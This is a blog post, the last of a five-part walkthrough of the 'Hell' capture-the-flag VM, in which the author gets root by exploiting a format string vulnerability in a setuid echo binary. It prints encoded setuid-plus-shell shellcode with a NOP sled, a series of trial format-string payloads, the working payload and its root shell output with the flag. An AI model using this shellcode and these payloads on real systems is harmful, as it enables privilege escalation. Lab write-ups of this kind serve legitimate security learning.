
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>Hell Walkthrough – Part 5 - FourFourFourFour</title>
	<meta name="author" content="recrudesce">

	
	<meta name="description" content="Part 1 | Part 2 | Part 3 | Part 4 | Part 5 This is the last step. The last hoop that needs to be jumped through. The last wall of hurdles between me &hellip;">
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
	<link rel="canonical" href="">
	<link href="/favicon.png" rel="shortcut icon">
	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
	<script async="true" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
	
</head>


<body>
	<header id="header" class="inner"><h1><a href="/">FourFourFourFour</a></h1>
<nav id="main-nav"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</nav>
<nav id="mobile-nav">
	<div class="alignleft menu">
		<a class="button">Menu</a>
		<div class="container"><ul class="main">
	<li><a href="/">Blog</a></li>
	<li><a href="/archives">Archives</a></li>
</ul>
</div>
	</div>
	<div class="alignright search">
		<a class="button"></a>
		<div class="container">
			<form action="https://www.google.com/search" method="get">
				<input type="text" name="q" results="0">
				<input type="hidden" name="q" value="site:recrudesce.github.io">
			</form>
		</div>
	</div>
</nav>
<nav id="sub-nav" class="alignright">
	<div class="social">
		
		
		
		<a class="twitter" href="http://twitter.com/recrudesce" title="Twitter">Twitter</a>
		
		
    
		
		
		
		
		
		<a class="rss" href="/atom.xml" title="RSS">RSS</a>
		
    
	</div>
	<form class="search" action="https://www.google.com/search" method="get">
		<input class="alignright" type="text" name="q" results="0">
		<input type="hidden" name="q" value="site:recrudesce.github.io">
	</form>
</nav>

</header>
	
		
	
	<div id="content" class="inner"><article class="post">
	<h2 class="title">Hell Walkthrough – Part 5</h2>
	<div class="entry-content"><p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | Part 5</p>

<p>This is the last step. The last hoop that needs to be jumped through. The last wall of hurdles between me and root. LET&rsquo;S DO THIS !</p>

<h2>Orange Juice Doesn&rsquo;t Echo</h2>

<p>The OJ user has 1 file, a binary called echo which does exactly that, it repeats what you send it. This guy is the height of programming ability. There&rsquo;s got to be something wrong with it.</p>

<!-- more -->


<p>A quick look at the binary in IDA, and yes there is something wrong with it, there seems to be something in it that is called a &ldquo;format string vulnerability&rdquo;.</p>

<p><img src="https://pmpaspeakingofprecision.files.wordpress.com/2014/07/confused-child.jpg" alt="" /></p>

<p>wut ?</p>

<p>What felt like 12 days of reading, and video watching (Fuzzy Security videos are the best - check <a href="https://www.youtube.com/watch?v=NwzmYSlETI8">this one out for formatstr vuln explanation</a> and the <a href="https://www.youtube.com/watch?v=CHrs30g-3O0">follow up</a>) I still felt none the wiser.  But I figured I&rsquo;d give it a go anyway.  What&rsquo;s the worst that can happen ?  I can&rsquo;t make it any more wrong now can I ?</p>

<p>Meh, let&rsquo;s put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we&rsquo;re progressing.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">SHELLCODE</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot; * 1000 + &quot;\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41&quot;&#39;</span><span class="k">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, I started to play around with gdb and format strings.
There are several ways you can do format string vulnerabilities - you can put your shellcode in memory using an environment variable, then overwrite a global offset table entry to execute your code (as per the videos), or if you&rsquo;re unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that&hellip; it didn&rsquo;t work because my shellcode kept moving in memory.</p>

<p><img src="http://media.tumblr.com/201153f420ed4a2ca50fadbcfabacce3/tumblr_inline_n1mltcP4Bf1ss9nq4.gif" alt="" /></p>

<p>Apparently, though, you can overwrite entries in the .dtor part of the binary - don&rsquo;t ask me what .dtor is, but I had great fun gradually overwriting random memory locations and crashing the application over and over and over again&hellip;</p>

<p>Here are some of the format strings I fabricated while on my journey - you can get an idea of my thought pattern and the things I tested.  It&rsquo;s also pretty obvious when I went back to basics about 7 attempts in.</p>

<p>[plain]
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%116\$n
$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)-%64362u-%117\$n.
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%64362u-%119\$n.
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo; + &ldquo;\x5e\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%4\$n-%5\$n
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%116\$n.
$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)%117\$x
%64364u$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%119\$n.
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217u%119\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABB-%00001c%116\$.x%00001c%114\$.x
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%113\$hn%15217c%112\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%118\$hn%15217u%117\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217c%119\$hn</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I spent a lot of <span class="nb">time </span>staring at segfault after segfault <span class="k">until</span> I stumbled upon this random combination of characters <span class="o">(</span>I really really want to explain how I worked it out, but I<span class="s1">&#39;m not 100% sure myself. I guess that&#39;</span>s a follow up post sometime. Also, it is possible this wont work <span class="k">for</span> you<span class="o">)</span>.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>plain<span class="o">]</span>
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAAB%49139u%118<span class="se">\$</span>hn%15217c%117<span class="se">\$</span>hn
</span></code></pre></td></tr></table></div></figure>


<p>Which when executed like this</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/home/oj/echo <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAAB%49139u%118<span class="se">\$</span>hn%15217c%117<span class="se">\$</span>hn
</span></code></pre></td></tr></table></div></figure>


<p>dropped me to a shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># id </span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1005<span class="o">(</span>oj<span class="o">)</span>
</span><span class='line'><span class="c"># whoami </span>
</span><span class='line'>root
</span><span class='line'><span class="c"># cat /root/flag.txt </span>
</span><span class='line'>Congratulations of beating Hell.
</span><span class='line'>
</span><span class='line'>I hope you enjoyed it and there weren<span class="err">&#39;</span>t to many trolls in here <span class="k">for</span> you.
</span><span class='line'>
</span><span class='line'>Hit me up on irc.freenode.net in <span class="c">#vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242 </span>
</span><span class='line'>
</span><span class='line'>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif" alt="" /></p>

<p>Like a baws.  Now I&rsquo;m going to exorcise the VM and purge every last shred of it from my SSD.  BEGONE FOUL DEMON !</p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-07-21T22:14:03+01:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>